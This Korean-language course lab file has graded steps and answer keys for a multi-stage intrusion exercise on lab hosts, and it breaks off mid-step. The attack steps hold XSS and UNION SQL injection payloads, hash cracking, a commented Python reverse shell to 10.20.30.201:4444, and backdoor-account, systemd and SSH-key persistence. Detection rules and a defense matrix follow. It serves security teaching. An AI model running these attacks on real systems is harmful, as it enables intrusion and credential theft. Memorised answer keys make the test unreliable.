lab_id: battle-adv-nonai-week02
title: 다단계 침투 — Initial Access → Execution → Persistence
version: non-ai
course: battle-adv-nonai
week: 2
description: MITRE ATT&CK의 Initial Access, Execution, Persistence 전술을 연계하여 다단계 침투 시나리오를 실습한다. 각 단계의 기법을 이해하고 탐지 및 방어 방법을 학습한다.
difficulty: hard
duration_minutes: 150
objectives:
- Initial Access 기법(피싱, 취약점 악용)을 실습한다
- Execution 기법(명령어 인터프리터, 스크립팅)을 이해한다
- Persistence 기법(계정 생성, 서비스 등록, 크론잡)을 실습한다
- 다단계 공격 체인의 탐지 포인트를 식별한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: Initial Access 기법 분석을 위해 타겟 웹 서버 10.20.30.80의 외부 노출 서비스를 열거하라. Nmap으로 상위 1000개 포트를 스캔하고 서비스 버전을 확인하라.
  hint: nmap -sV --top-ports 1000 옵션을 사용한다.
  category: recon
  points: 10
  answer: nmap -sV --top-ports 1000 -oN /tmp/multi_stage_recon.txt 10.20.30.80
  answer_detail: Initial Access 준비 단계에서 외부 노출 서비스를 정확히 파악하는 것이 중요하다. 서비스 버전 정보는 CVE 매칭과 exploit 선택에 직접 활용된다. MITRE ATT&CK T1046(Network Service Discovery)에 해당한다.
  verify:
    type: output_contains
    expect: open
  target_vm: attacker
- order: 2
  instruction: 웹 서버의 디렉토리 구조를 열거하라. gobuster 또는 dirb를 사용하여 숨겨진 엔드포인트를 발견하라.
  hint: dirb를 사용하고 common.txt 워드리스트를 지정한다.
  category: recon
  points: 10
  answer: dirb http://10.20.30.80 /usr/share/dirb/wordlists/common.txt -o /tmp/dirb_result.txt 2>&1 | tail -20
  answer_detail: 디렉토리 열거(T1595.003)는 웹 애플리케이션의 숨겨진 관리 페이지, 설정 파일, 백업 파일 등을 발견하는 기법이다. /admin, /backup, /.git, /config 등의 경로가 노출되면 Initial Access 벡터로 활용될 수 있다.
  verify:
    type: output_contains
    expect: FOUND
  target_vm: attacker
- order: 3
  instruction: 발견된 웹 서비스에 대해 XSS(Cross-Site Scripting) 취약점을 테스트하라. JuiceShop의 검색 기능에 Reflected XSS 페이로드를 삽입하라.
  hint: 검색 쿼리 파라미터에 <script>alert(1)</script> 페이로드를 포함한다.
  category: exploit
  points: 10
  answer: curl -s 'http://10.20.30.80/#/search?q=<iframe%20src%3D"javascript:alert(1)">' -o /tmp/xss_test.html && grep -c 'script\|iframe\|alert' /tmp/xss_test.html
  answer_detail: Reflected XSS(T1189)는 사용자 입력이 서버 응답에 그대로 반영될 때 발생한다. JuiceShop의 검색 기능은 DOM 기반 XSS에 취약하다. 이를 통해 세션 쿠키 탈취, 키로깅, 피싱 리다이렉트 등의 공격이 가능하다.
  verify:
    type: output_contains
    expect: '0'
  target_vm: attacker
- order: 4
  instruction: SQL Injection을 통해 데이터베이스에서 사용자 목록을 추출하라. JuiceShop의 REST API에 UNION 기반 SQLi를 수행하라.
  hint: products/search 엔드포인트에 UNION SELECT를 사용하여 Users 테이블 데이터를 추출한다.
  category: exploit
  points: 10
  answer: curl -s "http://10.20.30.80/rest/products/search?q=test'))UNION%20SELECT%20id,email,password,role,'5','6','7','8','9'%20FROM%20Users--" | python3 -m json.tool | head -30
  answer_detail: UNION 기반 SQL Injection(T1190)은 원래 쿼리에 UNION SELECT를 추가하여 다른 테이블의 데이터를 함께 조회하는 기법이다. 칼럼 수를 맞추는 것이 핵심이며, 성공 시 사용자 이메일, 비밀번호 해시, 역할 등을 추출할 수 있다.
  verify:
    type: output_contains
    expect: email
  target_vm: attacker
- order: 5
  instruction: 추출한 비밀번호 해시를 크래킹하라. John the Ripper 또는 hashcat을 사용하여 MD5 해시를 복호화하라.
  hint: 해시를 파일에 저장한 후 john --format=raw-md5 --wordlist 옵션을 사용한다.
  category: exploit
  points: 10
  answer: echo '0192023a7bbd73250516f069df18b500' > /tmp/hashes.txt && john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt 2>&1 | head -10
  answer_detail: 자격 증명 크래킹(T1110.002)은 추출된 해시를 평문 비밀번호로 복원하는 과정이다. MD5는 빠른 해시 함수이므로 초당 수십억 개의 시도가 가능하다. rockyou.txt와 같은 워드리스트를 사용한 사전 공격이 효과적이다.
  verify:
    type: output_contains
    expect: john
  target_vm: attacker
- order: 6
  instruction: Execution 기법을 실습하라. Python을 이용한 리버스 쉘을 시뮬레이션하되, 실제 연결 대신 명령어 구조만 확인하라. 리버스 쉘 코드를 생성하여 파일로 저장하라.
  hint: Python socket 모듈을 이용한 리버스 쉘 코드를 작성한다.
  category: exploit
  points: 10
  answer: 'cat > /tmp/reverse_shell_sim.py << ''PYEOF''

    import socket,subprocess,os

    # SIMULATION ONLY - DO NOT EXECUTE

    # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    # s.connect(("10.20.30.201",4444))

    # os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)

    # subprocess.call(["/bin/sh","-i"])

    print("Reverse shell simulation - code structure verified")

    PYEOF

    python3 /tmp/reverse_shell_sim.py'
  answer_detail: 'Command and Scripting Interpreter: Python(T1059.006)은 APT가 자주 사용하는 Execution 기법이다. Python 리버스 쉘은 socket으로 공격자 서버에 연결하고 dup2로 stdin/stdout/stderr을 소켓으로 리다이렉트한 후 /bin/sh를 실행한다. 탐지: python
    프로세스의 네트워크 연결 모니터링.'
  verify:
    type: output_contains
    expect: simulation
  target_vm: attacker
- order: 7
  instruction: 'Persistence 기법 1: 신규 사용자 계정을 생성하여 백도어 계정으로 활용하는 시나리오를 시뮬레이션하라. /etc/passwd 형식의 엔트리를 생성하라. (실제 계정 생성 금지)'
  hint: useradd 명령의 결과를 시뮬레이션하여 파일에 기록한다.
  category: exploit
  points: 10
  answer: echo 'svc_update:x:1099:1099:Service Update:/home/svc_update:/bin/bash' > /tmp/persistence_account_sim.txt && echo 'Simulated backdoor account entry:' && cat /tmp/persistence_account_sim.txt
  answer_detail: 'Create Account: Local Account(T1136.001)는 APT가 자주 사용하는 Persistence 기법이다. 정상 서비스 계정처럼 보이는 이름(svc_update, backup_admin)을 사용하여 탐지를 회피한다. 방어: /etc/passwd 변경 모니터링(auditd), 계정 생성 로그(useradd)
    감시.'
  verify:
    type: output_contains
    expect: svc_update
  target_vm: attacker
- order: 8
  instruction: 'Persistence 기법 2: systemd 서비스를 이용한 지속성 확보를 시뮬레이션하라. 악성 서비스 유닛 파일을 /tmp에 작성하라. (실제 설치 금지)'
  hint: systemd service 유닛 파일 형식으로 작성하되, ExecStart에 리버스 쉘을 설정한다.
  category: exploit
  points: 10
  answer: 'cat > /tmp/persistence_service_sim.service << ''EOF''

    [Unit]

    Description=System Health Monitor

    After=network.target


    [Service]

    Type=simple

    ExecStart=/bin/bash -c ''echo PERSISTENCE_SERVICE_ACTIVE > /tmp/svc_beacon.txt''

    Restart=always

    RestartSec=60


    [Install]

    WantedBy=multi-user.target

    EOF

    cat /tmp/persistence_service_sim.service'
  answer_detail: 'Create or Modify System Process: Systemd Service(T1543.002)는 리눅스에서 가장 효과적인 Persistence 기법 중 하나이다. 시스템 부팅 시 자동 실행되며, Restart=always로 프로세스 종료 시 자동 재시작된다. 정상 서비스명으로 위장하여 탐지를 회피한다.'
  verify:
    type: output_contains
    expect: multi-user.target
  target_vm: attacker
- order: 9
  instruction: 'Persistence 기법 3: SSH authorized_keys를 이용한 지속적 접근을 시뮬레이션하라. 공격자의 SSH 공개키를 삽입하는 시나리오를 테스트하라.'
  hint: ssh-keygen으로 키 쌍을 생성하고 authorized_keys 파일에 추가하는 시나리오를 시뮬레이션한다.
  category: exploit
  points: 10
  answer: ssh-keygen -t ed25519 -f /tmp/apt_key_sim -N '' -q && echo 'Simulated attacker public key:' && cat /tmp/apt_key_sim.pub && echo 'Would be appended to ~/.ssh/authorized_keys'
  answer_detail: 'Account Manipulation: SSH Authorized Keys(T1098.004)는 공격자가 자신의 SSH 공개키를 타겟의 authorized_keys에 추가하여 비밀번호 없이 접속하는 기법이다. ed25519는 짧은 키 길이로 탐지가 어렵다. 방어: authorized_keys 파일 무결성 모니터링(FIM).'
  verify:
    type: output_contains
    expect: ed25519
  target_vm: attacker
- order: 10
  instruction: 다단계 침투 과정에서 생성된 아티팩트를 탐지하라. auditd 규칙을 작성하여 /etc/passwd 수정, SSH 키 변경, crontab 수정을 모니터링하라.
  hint: auditctl -w 명령으로 파일 감시 규칙을 추가한다.
  category: defense
  points: 10
  answer: 'cat > /tmp/audit_persistence_rules.conf << ''EOF''

    -w /etc/passwd -p wa -k persistence_account

    -w /etc/shadow -p wa -k persistence_account

    -w /etc/crontab -p wa -k persistence_cron

    -w /var/spool/cron/ -p wa -k persistence_cron

    -w /etc/systemd/system/ -p wa -k persistence_service

    -w /root/.ssh/authorized_keys -p wa -k persistence_ssh

    EOF

    cat /tmp/audit_persistence_rules.conf'
  answer_detail: auditd는 리눅스 커널 수준의 감사 시스템으로, 파일 접근/수정을 실시간으로 기록한다. -w(watch)로 파일을 감시하고, -p wa(write/attribute change)로 수정 이벤트를 기록하며, -k(key)로 이벤트를 분류한다. Persistence 기법별 핵심 파일을 모니터링한다.
  verify:
    type: output_contains
    expect: persistence
  target_vm: attacker
- order: 11
  instruction: 네트워크 레벨에서 침투 행위를 탐지하기 위한 Suricata 커스텀 규칙을 작성하라. SQL Injection과 리버스 쉘 연결 시도를 탐지하라.
  hint: alert http/tcp 규칙으로 SQL 키워드와 비정상 포트 연결을 탐지한다.
  category: defense
  points: 10
  answer: 'cat > /tmp/custom_detection.rules << ''EOF''

    alert http any any -> 10.20.30.0/24 any (msg:"SQLI Attempt - UNION SELECT"; flow:to_server,established; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; within:20; sid:1000001; rev:1;)

    alert tcp 10.20.30.0/24 any -> any 4444 (msg:"Possible Reverse Shell - Port 4444"; flow:established; sid:1000002; rev:1;)

    alert tcp 10.20.30.0/24 any -> any any (msg:"Suspicious Python Reverse Shell"; content:"|2f 62 69 6e 2f 73 68|"; sid:1000003; rev:1;)

    EOF

    cat /tmp/custom_detection.rules'
  answer_detail: Suricata 커스텀 규칙으로 조직 특화된 탐지를 구현한다. SQL Injection 탐지는 HTTP 트래픽에서 UNION SELECT 패턴을 검사하고, 리버스 쉘 탐지는 비정상 포트(4444)로의 아웃바운드 연결과 /bin/sh 바이너리 시그니처를 검사한다.
  verify:
    type: output_contains
    expect: UNION SELECT
  target_vm: attacker
- order: 12
  instruction: Wazuh SIEM에서 다단계 침투를 탐지하기 위한 커스텀 규칙을 작성하라. 5분 내 3개 이상의 Persistence 기법이 감지되면 알림을 발생시키는 상관 분석 규칙을 만들어라.
  hint: Wazuh의 composite rule 문법으로 frequency와 timeframe을 설정한다.
  category: defense
  points: 10
  answer: "cat > /tmp/wazuh_multistage_rule.xml << 'EOF'\n<group name=\"multistage_attack\">\n  <rule id=\"100100\" level=\"12\" frequency=\"3\" timeframe=\"300\">\n    <if_matched_group>persistence_detection</if_matched_group>\n\
    \    <description>Multi-stage attack detected: 3+ persistence techniques in 5 minutes</description>\n    <mitre>\n      <id>T1053</id>\n      <id>T1136</id>\n      <id>T1543</id>\n    </mitre>\n  </rule>\n\
    \  <rule id=\"100101\" level=\"10\">\n    <if_sid>550</if_sid>\n    <match>useradd|adduser</match>\n    <group>persistence_detection</group>\n    <description>Persistence: New user account created</description>\n\
    \  </rule>\n  <rule id=\"100102\" level=\"10\">\n    <if_sid>552</if_sid>\n    <match>crontab</match>\n    <group>persistence_detection</group>\n    <description>Persistence: Crontab modified</description>\n\
    \  </rule>\n</group>\nEOF\ncat /tmp/wazuh_multistage_rule.xml"
  answer_detail: Wazuh 상관 분석 규칙은 개별 이벤트를 연결하여 다단계 공격을 탐지한다. frequency와 timeframe으로 시간 윈도우 내 이벤트 빈도를 추적하며, if_matched_group으로 관련 이벤트 그룹을 지정한다. MITRE ATT&CK ID를 태깅하여 공격 기법을 분류한다.
  verify:
    type: output_contains
    expect: multistage_attack
  target_vm: attacker
- order: 13
  instruction: 침투 과정의 타임라인을 재구성하라. 시스템 로그, 네트워크 로그, 파일 시스템 변경 사항을 시간순으로 정리하라.
  hint: 다양한 로그 소스의 타임스탬프를 통합하여 시간순 정렬한다.
  category: analysis
  points: 10
  answer: 'cat > /tmp/attack_timeline.txt << ''EOF''

    === Multi-Stage Attack Timeline ===

    [T+00:00] Reconnaissance: Port scan from 10.20.30.201 → 10.20.30.80 (T1046)

    [T+00:05] Reconnaissance: Directory enumeration via dirb (T1595.003)

    [T+00:10] Initial Access: XSS test on search function (T1189)

    [T+00:15] Initial Access: SQL Injection on REST API (T1190)

    [T+00:20] Credential Access: Password hash extraction (T1003)

    [T+00:25] Credential Access: Hash cracking with john (T1110.002)

    [T+00:30] Execution: Reverse shell code prepared (T1059.006)

    [T+00:35] Persistence: Backdoor account simulated (T1136.001)

    [T+00:40] Persistence: Systemd service created (T1543.002)

    [T+00:45] Persistence: SSH key injection simulated (T1098.004)

    EOF

    cat /tmp/attack_timeline.txt'
  answer_detail: 공격 타임라인 재구성은 침해 사고 분석의 핵심이다. 다양한 로그 소스(syslog, auth.log, access.log, IDS 알림)의 타임스탬프를 통합하여 공격자의 행동을 시간순으로 재구성한다. MITRE ATT&CK ID를 매핑하여 각 행위의 전술적 의미를 파악한다.
  verify:
    type: output_contains
    expect: Timeline
  target_vm: attacker
- order: 14
  instruction: 다단계 침투에 대한 방어 체계를 설계하라. 킬체인 각 단계별 탐지-차단-대응 매트릭스를 작성하라.
  hint: Initial Access, Execution, Persistence 각각에 대해 Prevention/Detection/Response를 정의한다.
  category: defense
  points: 10
  answer: 'cat > /tmp/defense_matrix.txt << ''EOF''

    === Defense Matrix: Multi-Stage Intrusion ===


    | Stage | Prevention | Detection | Response |

    |-------|-----------|-----------|----------|

    | Initial Access | WAF, 패치관리, MFA | IDS/IPS, 웹로그 분석 | IP 차단, 세션 무효화 |

    | Execution | AppArmor, SELinux | EDR, 프로세스 모니터링 | 프로세스 종료, 격리 |

    | Persistence | FIM, 계정정책 | auditd, SIEM 상관분석 | 아티팩트 제거, 계정 비활성화 |


    Key Controls:

    1. Network Segmentation (10.20.30.0/24 내부 세그먼트 분리)

    2. Least Privilege (서비스 계정 최소 권한)

    3. Continuous Monitoring (24/7 SOC 운영)

    4. Incident Response Plan (IR 플레이북 정비)

    EOF

    cat /tmp/defense_matrix.txt'
  answer_detail: Defense-in-Depth 전략은 킬체인 각 단계에서 다중 방어 계층을 구축한다. Prevention(사전 차단), Detection(탐지), Response(대응)의 3축으로 방어 매트릭스를 구성하고, Network Segmentation과 Least Privilege를 기본 원칙으로 적용한다.
  verify:
    type: output_contains
    expect: Defense Matrix
  target_vm: attacker
- order: 15
  instruction: 다단계 침투 실습의 종합 보고서를 작성하라. 공격 경로, 사용된 기법, 탐지 현황, 개선 권고사항을 포함하는 침투 테스트 보고서를 작성하라.
  hint: PTES(Penetration Testing Execution Standard) 형식으로 작성한다.
  category: analysis
  points: 15
  answer: "cat > /tmp/pentest_report_week02.txt << 'EOF'\n=== Penetration Test Report: Multi-Stage Intrusion ===\nDate: 2026-04-03 | Tester: Lab Student | Scope: 10.20.30.0/24\n\n1. Executive Summary\n\
